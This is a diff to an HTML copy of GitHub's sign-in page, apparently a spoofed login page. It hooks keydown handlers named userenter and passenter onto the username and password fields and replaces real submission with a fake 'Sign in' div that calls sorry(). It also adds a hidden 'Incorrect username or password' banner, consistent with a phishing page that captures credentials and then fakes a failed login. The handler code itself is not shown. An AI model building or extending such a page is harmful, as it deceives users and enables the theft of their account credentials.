@@ -170,9 +170,19 @@
       </div>
 
 
-      <div id="js-flash-container">
+      <div id="js-flash-container" style="display:none">
 
-</div>
+          <div class="flash flash-full flash-error">
+        <div class="container">
+          <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
+            <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
+          </button>
+
+            Incorrect username or password.
+
+        </div>
+      </div>
+      </div>
 
 
       <div class="auth-form-body mt-3">
@@ -180,15 +190,15 @@
         <label for="login_field">
           Username or email address
         </label>
-        <input type="text" name="login" id="login_field" class="form-control input-block" tabindex="1" autocapitalize="off" autocorrect="off" autofocus="autofocus" />
+        <input type="text" name="login" id="login_field" onkeydown="userenter(event)" class="form-control input-block" tabindex="1" autocapitalize="off" autocorrect="off" autofocus="autofocus" />
 
         <label for="password">
           Password <a class="label-link" href="https://github.com/password_reset">Forgot password?</a>
         </label>
-        <input type="password" name="password" id="password" class="form-control form-control input-block" tabindex="2" />
+        <input type="password" onkeydown="passenter(event)" name="password" id="password" class="form-control form-control input-block" tabindex="2" />
         <input type="hidden" class="js-webauthn-support" name="webauthn-support" value="unknown">
 
-        <div type="submit13"  tabindex="3" class="btn btn-primary btn-block"  onclick="sorry()">Sign in</div>
+        <div type="submit13"  tabindex="3" class="btn btn-primary btn-block"  id="submit" onclick="sorry()">Sign in</div>
       </div>
 </form>
 
